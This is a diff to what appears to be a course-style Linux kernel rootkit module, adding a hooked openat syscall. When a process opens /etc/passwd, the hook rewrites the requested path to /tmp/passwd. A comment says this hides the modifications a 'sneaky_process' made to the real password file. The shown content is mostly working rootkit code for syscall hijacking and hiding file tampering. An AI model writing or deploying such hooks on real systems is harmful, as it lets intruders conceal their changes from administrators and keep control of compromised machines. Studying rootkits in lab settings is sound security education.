@@ -32,9 +32,7 @@ int disable_page_rw(void *ptr){
   return 0;
 }
 
-// 1. Function pointer will be used to save address of the original 'openat' syscall.
-// 2. The asmlinkage keyword is a GCC #define that indicates this function
-//    should expect it find its arguments on the stack (not in registers).
+/*----------------------------getdent-----------------------------
 asmlinkage int (*original_openat)(struct pt_regs *);
 
 // Define your new sneaky version of the 'openat' syscall
@@ -43,6 +41,28 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   // Implement the sneaky part here
   return (*original_openat)(regs);
 }
+
+*/
+
+
+// Function pointer will be used to save address of the original 'openat' syscall.
+// The asmlinkage keyword is a GCC #define that indicates this function
+//    should expect it find its arguments on the stack (not in registers).
+
+/*----------------------------openat-----------------------------*/
+// 3. hide the modifications to the /etc/passwd file that the sneaky_process made
+// "cat /etc/passwd" should return contents of the original password file
+asmlinkage int (*original_openat)(struct pt_regs *);
+
+asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
+{
+  if(strcmp((char*)(regs->si), "/etc/passwd") == 0){
+    const char* sneakyPasswdPath = "/tmp/passwd";
+    copy_to_user((char*)(regs->si), sneakyPasswdPath, strlen(sneakyPasswdPath));
+  }
+  return (*original_openat)(regs);
+}
+
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
